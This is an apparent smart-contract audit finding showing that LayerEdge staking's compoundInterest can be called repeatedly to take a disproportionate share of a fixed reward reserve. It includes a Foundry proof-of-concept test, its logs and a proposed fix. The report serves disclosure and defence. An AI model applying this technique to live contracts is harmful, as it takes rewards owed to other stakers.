# Compound Interest can be gamed

## Vulnerability Details

LayerEdge permits any staker to compound their balances as long as they maintain an active stake with a positive balance. The problem arises when a staker can make frequent calls to `LayerEdgeStaking.compoundInterest`, gaming  the incentive system.

Each call leads to an increased balance, resulting in greater rewards for that staker. This situation disadvantages other stakers, who may only call `compoundInterest` less frequently.

Additionally, since the `rewardsReserve` consists of a fixed amount supplied by the admin or reward donors, it is conceivable that users with longer staking durations might be unable to claim or compound their rightful share of rewards.

## Root Cause

Lack of mechanisms to prevent stakers from making frequent compound interest calls.

## POC

Consider the following simplistic scenario

1. A total of 1e18 in rewards has been deposited.
2. Both Alice and Bob staked their positions at timestamp = 1.
3. Alice compounds her interest every 100 seconds until there are no more rewards left with a minimum stake of 3000e18 `LayerEdgen` tokens.
4. When Bob tries to compound his interest, the operation fails because Alice has continuously called `compoundInterest` and has already claimed all available rewards.
5. This scenario serves as a basic illustration of how the compounding system can be exploited, but the situation can be made worse when multiple users attempt to game the system simultaneously.

Consider another simplistic scenario

1. A certain amount of rewards has been deposited.
2. Both Alice and Bob staked 3000e18 `LayerEdgen` (MIN_STAKE) at timestamp = 1.
3. Alice repeatedly calls `LayerEdgeStaking.compoundInterest` every 10 seconds until timestamp = 101, maintaining her minimum stake of `3000e18` `LayerEdgen` tokens.
4. Bob compounds his interest at timestamp = 101.
5. Ultimately, Bob earns only `3329528158295281` in interest, while Alice accumulates `4756472191165429` in the same 100-second period.
6. Alice will only incur gas fees, but overall it'll be profitable for her. Additionally, she can repeatedly trigger `LayerEdgeStaking.compoundInterest` to increase her user balance and the subsequent interest assigned to her.
7. At the worse case scenario, other stakers (need not be Bob or Alice) might be unable to claim their fair share of the deposited rewards unless additional tokens are supplied / donated.

To run the below test:

1. Add the test `test_POC_compoundGame` to `LayerEdgeStakingTest.t.sol`
2. run `forge test --mt test_POC_compoundGame -vv`
 
Logs:
```bash
  Alice's interest claimed=  4756472191165429
  bob's interest claimed=  3329528158295281
  Difference in interest between Bob and Alice =  1426944032870148
```

```solidity
    function test_POC_compoundGame() public {
        vm.startPrank(alice);

        // Alice stakes at timestamp = 1
        vm.warp(1);
        token.approve(address(staking), MIN_STAKE);
        staking.stake(MIN_STAKE);
        (uint256 balance,,uint256 interestEarned,,,,,,) = staking.users(alice);

        uint256 timestamp = 1;
        for(uint256 i = 0; i < 10; i++) {
            timestamp += 10;
            vm.warp(timestamp);
            staking.compoundInterest();
        }

        (balance,,,interestEarned,,,,,) = staking.users(alice);
        uint256 aliceInterestEarned = balance - MIN_STAKE;
        console2.log("Alice's interest claimed= ", balance - MIN_STAKE);
        vm.stopPrank();

        // Bob stakes at timestamp = 1
        vm.startPrank(bob);

        vm.warp(1);
        token.approve(address(staking), MIN_STAKE);
        staking.stake(MIN_STAKE);
        (balance,,interestEarned,,,,,,) = staking.users(bob);

        vm.warp(101);

        vm.startPrank(bob);
        staking.compoundInterest();

        (balance,,,interestEarned,,,,,) = staking.users(bob);
        uint256 bobInterestEarned = balance - MIN_STAKE;
        console2.log("bob's interest claimed= ", bobInterestEarned);
        vm.stopPrank();

        console2.log("Difference in interest between Bob and Alice = ", aliceInterestEarned - bobInterestEarned);
    }
```

## Impact

Loss of rewards for other stakers. 
Other stakers might not be able to get their fair share of rewards

## Mitigation

Consider introducing a window during which users can compound their interest. Similar to the unstaking process, users would need to initiate a compound request first, and only after a predetermined `COMPOUND_WINDOW` can they execute `LayerEdgeStaking.compoundInterest`.

This will ensure users adhere to a consistent schedule for compounding their rewards.
